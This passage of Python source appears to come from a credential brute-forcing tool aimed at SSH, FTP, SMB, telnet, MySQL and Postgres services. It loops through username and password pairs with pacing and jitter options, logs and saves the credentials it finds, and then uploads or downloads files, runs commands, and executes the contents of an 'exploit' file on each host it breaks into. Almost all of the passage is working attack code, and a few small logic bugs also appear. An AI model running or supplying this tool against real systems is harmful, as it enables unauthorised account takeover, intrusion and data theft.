                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"file has been successfully downloaded to your computer as: {Style.BRIGHT + Fore.GREEN + self.download_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] file has been successfully downloaded to your computer as: {self.download_file_to}")
                self.sftp.close()
                return True

            else:
            
                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} file download failed,specify both the --download-file-to and --download-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] file download failed,specify both the --download-file-to and --download-file-from flags.")
                return False                  

        except Exception as e:
                
                self.safe_print(self.render_text("ERR",Back.RED,f"sftp error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] sftp error: {e}")
                return False


    def ftp_upload(self, connection : any) -> bool:

        try:

            if self.upload_file_to and self.upload_file_from:

                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"trying to upload the file from {Style.BRIGHT + Fore.BLUE + self.upload_file_from + Fore.RESET} to the server as {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] trying to upload the file from {self.upload_file_from} to the server as {self.upload_file_to}")
                with open(self.upload_file_from,"rb") as f:

                    connection.storbinary(f"STOR {self.upload_file_to}",f)

                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"file successfully uploaded to: {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] file successfully uploaded to: {self.upload_file_to}")
                connection.quit()
                return True

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} file download failed,specify both the --download-file-to and --download-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] file download failed,specify both the --download-file-to and --download-file-from flags.")
                return False      


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"ftp error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] ftp error: {e}")
            return False  

    def ftp_download(self, connection : any) -> bool:


        try:
        
            if self.download_file_to and self.download_file_from:
        
                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"trying to download the file from {Style.BRIGHT + Fore.GREEN + self.download_file_from + Fore.RESET} to your computer as {Style.BRIGHT + Fore.BLUE + self.download_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] trying to download the file from {self.download_file_from} to your computer as {self.download_file_to}")
                with open(self.download_file_to,"wb") as f:

                    connection.retrbinary(f"RETR {self.download_file_from}",f.write)
                
                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"file has been successfully downloaded to your computer as: {Style.BRIGHT + Fore.GREEN + self.download_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] file has been successfully downloaded to your computer as: {self.download_file_to}")
                connection.quit()
                return True
        
            else:
        
                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} file download failed,specify both the --download-file-to and --download-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] file download failed,specify both the --download-file-to and --download-file-from flags.")
                return False      
        
        
        except Exception as e:
        
            self.safe_print(self.render_text("ERR",Back.RED,f"ftp error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] ftp error: {e}")
            return False  

    def smb_upload(self, connection : any) -> bool:

        try:
        
            if self.upload_file_to and self.upload_file_from:
        
                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"trying to upload the file from {Style.BRIGHT + Fore.BLUE + self.upload_file_from + Fore.RESET} to the server as {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET} (share name: {Style.BRIGHT + Fore.GREEN + self.smb_share_name + Fore.RESET})"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] trying to upload the file from {self.upload_file_from} to the server as {self.upload_file_to} (share name: {self.smb_share_name})")
                with open(self.upload_file_from,"rb") as f:
        
                    connection.storeFile(self.smb_share_name,self.upload_file_to,f)
        
                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"file successfully uploaded to: {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] file successfully uploaded to: {self.upload_file_to}")
                connection.close()
                return True
        
            else:
        
                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} file download failed,specify both the --download-file-to and --download-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] file download failed,specify both the --download-file-to and --download-file-from flags.")
                return False      
        
        
        except Exception as e:
        
            self.safe_print(self.render_text("ERR",Back.RED,f"smb error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] smb error: {e}")
            return False  
        

    def smb_download(self, connection : any) -> bool:

        try:
                
            if self.download_file_to and self.download_file_from:

                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"trying to download the file from {Style.BRIGHT + Fore.GREEN + self.download_file_from + Fore.RESET} to your computer as {Style.BRIGHT + Fore.BLUE + self.download_file_to + Fore.RESET} (share name: {Style.BRIGHT + Fore.GREEN + self.smb_share_name + Fore.RESET})"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] trying to download the file from {self.download_file_from} to your computer as {self.download_file_to} (share name: {Style.BRIGHT + Fore.GREEN + self.smb_share_name + Fore.RESET})")
                with open(self.download_file_to,"wb") as f:
                
                    connection.retrieve(self.smb_share_name,self.download_file_from,f.write)
                
                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"file has been successfully downloaded to your computer as: {Style.BRIGHT + Fore.GREEN + self.download_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] file has been successfully downloaded to your computer as: {self.download_file_to}")
                connection.close()
                return True
                
            else:
                
                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} file download failed,specify both the --download-file-to and --download-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] file download failed,specify both the --download-file-to and --download-file-from flags.")
                return False      
                
                
        except Exception as e:
                
            self.safe_print(self.render_text("ERR",Back.RED,f"smb error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] smb error: {e}")
            return False  


    def make_worker(self, host: str, user: str, password: str,file):
        

        if self.stoping_event.is_set():

            return

        if self.delay_between > 0:

            with self.host_locks[host]:

                self.elapsed = time.time() - self.host_last_attempt[host]

                if self.elapsed < self.delay_between:
                    time.sleep(self.delay_between - self.elapsed)
                self.host_last_attempt[host] = time.time()

        if self.mode.rstrip().lower() in self.modes[self.mode][0]:
            return self.modes[self.mode][1](host, user, password,file)


    def execute_command(self,connection : any,command : str) -> str:

        try:


            if self.mode == "ssh" or self.mode == "ssh-key":

                try:

                    self.stdin, self.stdout, self.stderr = connection.exec_command(command)
                    self.error = self.stderr.read().decode("utf-8")
                    self.output = self.stdout.read().decode().rstrip()

                    if self.output != "":
                        return self.output
                    return ""
                
                except Exception as e:

                    return e
                
            elif self.mode == "telnet":

                try:

                    connection.write(command.encode('ascii') + b"\n")
                    time.sleep(1)
                    self.output = connection.read_very_eager().decode().rstrip()

                    if self.output != "":
                        return self.output
                    return ""
                
                except Exception as e:
                    return e

            elif self.mode == "redis":

                try:

                    self.result = connection.execute_command(*command.split())
                    return str(self.result)
                
                except Exception as e:

                    return f"{e}"
                
            elif self.mode == "mysql":

                try:

                    self.cursor = connection.cursor()
                    self.cursor.execute(command)
                    self.result = self.cursor.fetchall()
                    self.cursor.close()
                    return str(self.result)
                
                except Exception as e:

                    return f"{e}"

            elif self.mode == "postgres":

                try:

                    self.cursor = connection.cursor()
                    self.cursor.execute(command)
                    self.result = self.cursor.fetchall()
                    self.cursor.close()
                    return str(self.result)
                
                except Exception as e:

                    return f"{e}"

        except Exception as e:
            
                self.safe_print(self.render_text("ERR",Back.RED,f"exploit error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] exploit error: {e}")





    def execute_exploit(self,connection : any,file : str) -> str:

            try:
        

                with open(file, "r") as f:
                
                    self.exploit_content = f.read()
        
        
                if self.mode == "ssh" or self.mode == "ssh-key":
        
                    try:

                        
        
                        self.stdin, self.stdout, self.stderr = connection.exec_command(self.exploit_content)
                        self.error = self.stderr.read().decode("utf-8")
                        self.output = self.stdout.read().decode().rstrip()
                        if self.output != "":
                            return self.output
                        return ""
                    
                    except Exception as e:
        
                        return e
                    
                elif self.mode == "telnet":
        
                    try:
        
                        connection.write(self.exploit_content.encode('ascii') + b"\n")
                        time.sleep(1)
                        self.output = connection.read_very_eager().decode().rstrip()
                        if self.output != "":
                            return self.output
                        return ""
                    
                    except Exception as e:
                        return e
        
                elif self.mode == "redis":
        
                    try:
        
                        self.result = connection.execute_command(*self.exploit_content.split())
                        return str(self.result)
                    
                    except Exception as e:
        
                        return f"{e}"
                    
                elif self.mode == "mysql":
        
                    try:
        
                        self.cursor = connection.cursor()
                        self.cursor.execute(self.exploit_content)
                        self.result = self.cursor.fetchall()
                        self.cursor.close()
                        return str(self.result)
                    
                    except Exception as e:
        
                        return f"{e}"
        
                elif self.mode == "postgres":
        
                    try:
        
                        self.cursor = connection.cursor()
                        self.cursor.execute(self.exploit_content)
                        self.result = self.cursor.fetchall()
                        self.cursor.close()
                        return str(self.result)
                    
                    except Exception as e:
        
                        return f"{e}"

            except Exception as e:

                self.safe_print(self.render_text("ERR",Back.RED,f"exploit error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] exploit error: {e}")
            




    def sort_data(self) -> bool:

        if self.min_length_password or self.max_length_password:

            self.filtered_passwords = []

            for password in self.passwords_list:

                if self.min_length_password and len(password) < self.min_length_password:
                    continue

                if self.max_length_password and len(password) > self.max_length_password:
                    continue

                self.filtered_passwords.append(password)

            self.passwords_list = self.filtered_passwords

            print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"filtered passwords/keys: {len(self.passwords_list)} remaining"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [FILTER PASSOWRDS/KEYS] [{self.mode.upper()}] filtered passwords/keys: {len(self.passwords_list)} remaining")


        if self.min_length_username or self.max_length_username:

            self.filtered_usernames = []

            for username in self.usernames_list:

                if self.min_length_username and len(username) < self.min_length_username:
                    continue

                if self.max_length_username and len(username) > self.max_length_username:
                    continue

                self.filtered_usernames.append(username)

            self.usernames_list = self.filtered_usernames

            print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"filtered usernames: {len(self.passwords_list)} remaining"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [FILTER USERNAMES] [{self.mode.upper()}] filtered usernames: {len(self.passwords_list)} remaining")


        return True


    def remove_duplicates(self) -> bool:

        try:


            self.usernames_list = list(dict.fromkeys(self.usernames_list))
            self.passwords_list = list(dict.fromkeys(self.passwords_list))

            if self.open_vpn_config_file_wordlist:
                self.open_vpn_config_file_wordlist = list(dict.fromkeys(self.open_vpn_config_file_wordlist))
                
            self.hosts = list(dict.fromkeys(self.hosts))

            print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"duplicates was removed..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] duplicates was removed...")
            time.sleep(3)

        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"duplicates error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] duplicates error: {e}")

        return True

    def keep_connection(self) -> bool:

        try:

            self.safe_print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"connection kept open , press Ctrl+C to close..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] connection kept open , press Ctrl+C to close...")
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
        
            self.safe_print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"closing connection..."))
            return True

    def save_results_output(self,string : str) -> bool:
        
        if self.save_results:

            with open(self.save_results, self.log_mode or "a", encoding="utf-8") as log_file:

                log_file.write(f"{string}\n")

            return True
        
        return True
        

    def parse_range(self, value: str) -> list:

        try:

            self.low , self.high = float(value.split('-')[0]) , float(value.split('-')[1])

            if len(value.split('-')) != 2:

                raise ValueError("Expected format: min-max")
            
            
            if self.low < 0 or self.high < 0:
                raise ValueError("Values must be positive")
            
            if self.low > self.high :

                raise ValueError("Low value cannot be greater than high value")
            
            return [self.low, self.high]
        
        except ValueError as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"invalid range format: {e} . expected: min-max (e.g., 0.5-2.5)"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] invalid range format: {e} . expected: min-max (e.g., 0.5-2.5)")
            sys.exit(1)


    def get_timeout(self) -> float:

        if self.random_timeout:
            
            return SystemRandom().uniform(self.random_timeout[0],self.random_timeout[1]) + self.jitter 
        
        return self.timeout + self.jitter

    def check_timer(self) -> bool:

        if self.is_timer_stop:
                
                self.stop_timer.cancel()

                sys.exit(0)
        
    def max_time_exit_program(self):


        self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"the runtime limit of {Style.BRIGHT + Fore.BLUE + str(self.max_time) + Style.RESET_ALL} seconds has been exceeded"))
        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] The runtime limit of {self.max_time} seconds has been exceeded")
        self.is_timer_stop = True
        self.stoping_event.set()
        sys.exit(0)
        

    def success_exit(self) -> bool:
            
            if self.stop_on_success:

                self.stoping_event.set()
                self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,"stop on success enabled, exiting...."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Stop on success enabled, exiting.....")
                os._exit(0)

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,"credentials found but stop-on-success is disabled. continuing..."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Credentials found but stop-on-success is disabled. Continuing...")

            self.stoping_event.set()
            return True


    def check_connections(self):

        if self.max_retries and self.max_retries == self.total_connections:
            
            self.stoping_event.set()
            self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"maximum number of reconnections reached: {Style.BRIGHT + Fore.WHITE + str(self.max_retries)}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Maximum number of reconnections reached: {self.max_retries}")
            sys.exit(0)

    def brute_ssh(self,host : str,user : str,password : str, file: str) -> bool:
        self.update()

        if self.stoping_event.is_set():
            return False

        try:

            if self.stoping_event.is_set():
                return False

            if self.output_file:
                paramiko.util.log_to_file(self.output_file)

            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.load_system_host_keys()
            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ssh credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SSH credentials {user}:{password}")
            
            if self.stoping_event.is_set():
                return False
            
            
            self.ssh_client.connect(hostname=host,
                                            port=self.port,
                                            username=user,
                                            password=password,
                                            timeout=self.get_timeout() or 30
                                            )
            
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ssh credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.stoping_event.set()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1

            self.check_flags(self.ssh_client,self.ssh_client.close)

        except paramiko.AuthenticationException as e:
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] SSH error: {e}")
            self.total_connections += 1

        finally:

            if self.ssh_client:
                self.ssh_client.close()

    

        
    def brute_ftp(self,host : str,user : str,password : str, file: str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                return False
        


        try:

            if self.stoping_event.is_set():
                return False


            self.ftp = FTP()
            time.sleep(self.get_timeout())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ftp credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing FTP credentials {user}:{password}")
            self.ftp.connect(host,self.port)   

            if self.stoping_event.is_set():
                return False
     
            self.ftp.login(user, password)
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ftp credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] FTP CREDENTIALS FOUND {user}:{password}")
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] FTP CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1

            self.check_flags(self.ftp,self.ftp.quit)
                
                
        except error_perm as e:
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP perm error: {e}")

        except error_temp as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"temporary ftp server error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Temporary FTP server error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False

        except error_reply as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"ftp server response error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP server response error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False
    
            


        except ConnectionRefusedError:

            self.safe_print(self.render_text("ERR",Back.RED,f"failed to connect to ftp {host}:{self.port} - port is closed or server is not running"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Failed to connect to FTP {host}:{self.port} - port is closed or server is not running")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False

        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"ftp unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP unknown error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1

        finally:

            if self.ftp:
                self.ftp.quit()
                


    def brute_smb(self,host : str,user : str,password : str, file: str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                return False
        
       
        try:

            if self.stoping_event.is_set():
                return False

            time.sleep(self.get_timeout())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing smb credentials {user}:{password} ()"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SMB credentials {user}:{password}")
            self.smbconnection = smb.SMBConnection(username=user,password=password,my_name = self.smb_client_name,remote_name = self.smb_server_name,domain=self.smb_domain,use_ntlm_v2=True, is_direct_tcp=True)

            if not self.smbconnection.connect(host,self.port or 445,timeout = self.get_timeout() or 10):
                raise Exception("smb connection faliled")

            self.shares = self.smbconnection.listShares()

            if self.shares:

                self.stoping_event.is_set()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"smb credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SMB CREDENTIALS FOUND {user}:{password}")
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SMB CREDENTIALS FOUND {user}:{password}")
            
                with self.connections_lock:
                    self.total_connections += 1
                
                self.check_flags(self.smbconnection,self.smbconnection.close)
                return True
            
        except Exception as e:

                        
                         
            if "STATUS_LOGON_FAILURE" in str(e):
                pass

            elif "STATUS_ACCOUNT_LOCKED_OUT" in str(e):
                    
                    self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"smb account locked: {str(e)}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] SMB account locked: {str(e)}")
                
            else:
                    
                    self.safe_print(self.render_text("ERR",Back.RED,f"smb unknown error: {e}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] SMB unknown error: {e}")

            
            with self.connections_lock:
                self.total_connections += 1
                

        finally:

            try:

                if self.smbconnection:
                    self.smbconnection.close()

            except:
                pass


                    
                    
    def brute_telnet(self, host: str, user: str, password: str, file: str) -> bool:

        if self.stoping_event.is_set():

            return

        async def _try():

            try:

                
                if self.stoping_event.is_set():
                    return False


                self.reader, self.writer = await telnetlib3.open_connection(host, self.port)

                await asyncio.sleep(0.3)


                self.writer.write(user + '\r\n')
                await asyncio.sleep(0.3)
                await asyncio.wait_for(self.reader.read(4096), timeout=5)
                self.writer.write(password + '\r\n')
                await asyncio.sleep(0.3)
                self.output = await asyncio.wait_for(self.reader.read(4096), timeout=5)
                self.writer.close()

                if b"incorrect" in self.output.lower() or b"invalid" in self.output.lower():
                    return False
                
                
                
                return True
            
            except Exception:

                return False

        try:

            if self.stoping_event.is_set():
                    return False

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing telnet credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Telnet credentials {user}:{password}")

            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.success = self.loop.run_until_complete(_try())
            self.loop.close()

            if self.success:

                self.stoping_event.set()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"telnet credentials found {user + Fore.RESET}:{password + Fore.RESET }"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Telnet CREDENTIALS FOUND {user}:{password}")
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Telnet CREDENTIALS FOUND {user}:{password}")
                
                with self.connections_lock:

                    self.total_connections += 1

                self.check_flags(self.telnet, None)

            else:

                 
                with self.connections_lock:

                    self.total_connections += 1
                    

        except Exception as e:

            self.safe_print(self.render_text("ERR", Back.RED, f"telnet error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Telnet error: {e}")
             
            with self.connections_lock:

                self.total_connections += 1
                    




    def brute_mysql(self,host : str,user : str,password : str, file: str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                    return False
        
        try:

            if self.stoping_event.is_set():
                    return False

            self.mysql_connection = pymysql.connect(
                        host=host,
                        port=self.port or 3306,
                        user=user,
                        password=password,
                        connect_timeout=self.get_timeout() or 10
                    )
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"mysql credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MySQL CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MySQL CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.check_flags(self.mysql_connection,self.mysql_connection.close)
                
                
                
        except pymysql.err.OperationalError as e:
            errcode = e.args[0]
            
            if errcode == 1045:  
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing mysql credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing MySQL credentials {user}:{password}")
            

            elif errcode == 2003:
                
                self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to mysql server on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to MySQL server on {self.target_host}")

            elif errcode == 1129:
            
                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"host {self.target_host} is blocked by mysql server"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Host {self.target_host} is blocked by MySQL server")

             
                with self.connections_lock:

                    self.total_connections += 1
                    

        except pymysql.err.InternalError as e:
                
                self.safe_print(self.render_text("ERR",Back.RED,f"mysql internal error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MySQL internal error: {e}")
                 
                with self.connections_lock:

                    self.total_connections += 1
                    

        except Exception as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"mysql unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MySQL unknown error: {e}")
            
            with self.connections_lock:

                self.total_connections += 1
                    
                








    def brute_postgres(self,host : str,user : str,password : str, file: str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False
       
        try:

            if self.stoping_event.is_set():
                    return False

            self.postgres_connection = psycopg2.connect(
                        host=host,
                        port=self.port or 5432,
                        user=user,
                        password=password,
                        connect_timeout=self.get_timeout() or 10
                    )   
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"postgres credentials found {Style.BRIGHT + Fore.GREEN + user + Fore.RESET}:{Style.BRIGHT + Fore.GREEN + password + Fore.RESET}"))
            self.success_exit()
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Postgres CREDENTIALS FOUND {user}:{password}")
